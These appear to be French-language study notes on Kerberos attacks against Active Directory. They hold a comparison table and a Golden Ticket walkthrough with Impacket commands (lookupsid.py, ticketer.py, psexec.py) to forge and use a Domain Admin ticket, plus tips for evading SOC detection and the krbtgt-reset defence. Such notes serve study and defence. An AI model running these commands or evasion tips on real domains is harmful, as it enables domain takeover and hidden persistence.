## Attaques Kerberos

| Attaque                   | Ce qu'on vole            | Prérequis                    | Étapes                                          | Résultat                                |
| ------------------------- | ------------------------ | ---------------------------- | ----------------------------------------------- | --------------------------------------- |
| **Pass-the-Ticket (TGT)** | TGT en mémoire           | SYSTEM sur une machine       | Voler → injecter → demander TGS                 | Accès à tous les services de la victime |
| **Pass-the-Ticket (TGS)** | TGS en mémoire           | SYSTEM sur une machine       | Voler → injecter → présenter au service         | Accès à UN service                      |
| **Kerberoasting**         | TGS demandé légitimement | Compte valide sur le domaine | Lister SPN → demander TGS → cracker offline     | Mdp du compte de service (si faible)    |
| **Golden Ticket**         | Hash krbtgt              | SYSTEM sur le DC             | Voler hash → forger TGT → usurper n'importe qui | Accès total, persistance longue durée   |
| **Silver Ticket**         | Hash compte de service   | SYSTEM sur une machine       | Voler hash → forger TGS → accès direct          | Accès à UN service, sans log côté DC    |

### Règles à retenir
- Pass-the-something → ticket **volé**, pas de crack
- Kerberoasting → ticket **demandé légitimement**, cracké offline
- Golden Ticket → bypass total du KDC, seule défense = régénérer krbtgt 2x
- Silver Ticket → plus discret que Golden, KDC jamais consulté

---

### Golden Ticket — détails

**Principe** : un Golden Ticket est un TGT forgé manuellement avec le hash `krbtgt`.
Le DC valide uniquement la signature — il ne peut pas distinguer un TGT légitime d'un TGT forgé.

**Prérequis** : hash `krbtgt` + SID du domaine (nécessite SYSTEM sur le DC)

**Récupérer le SID du domaine**
```bash
lookupsid.py domain.local/user:password@<DC_IP>
# ou depuis Windows
wmic useraccount get name,sid
```

**Forger le ticket**
```bash
ticketer.py \
  -nthash <hash_krbtgt> \   # signe le ticket
  -domain-sid <SID_domaine> \ # partie commune à tous les objets du domaine
  -domain domain.local \
  -groups 512 \             # Domain Admins
  -user-id 500 \            # RID Administrator (garanti d'exister)
  Administrator             # username — doit exister pour être discret
```

**Utiliser le ticket**
```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@cible
```

**Structure d'un SID**

```
S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-RID
                                           ^^^
                                           500 = Administrator
                                           
|_______________________________________|
            SID du domaine
            (commun à tous les objets)
```

| RID | Compte                                     |
| --- | ------------------------------------------ |
| 500 | Administrator (intégré, garanti d'exister) |

**Discrétion**
- Utiliser un username réel + son RID réel → SID cohérent dans les logs
- Ajouter Domain Admins (512) dans le PAC — non vérifié contre l'AD
- Durée 10h (norme Windows) — pas 10 ans
- Un SOC peut détecter : TGS-REQ (event 4769) sans AS-REQ (4768) en amont, durée anormale, username inexistant, SID incohérent

**Persistance** : résiste aux changements de mots de passe.
Seule défense : régénérer le hash `krbtgt` **deux fois**.

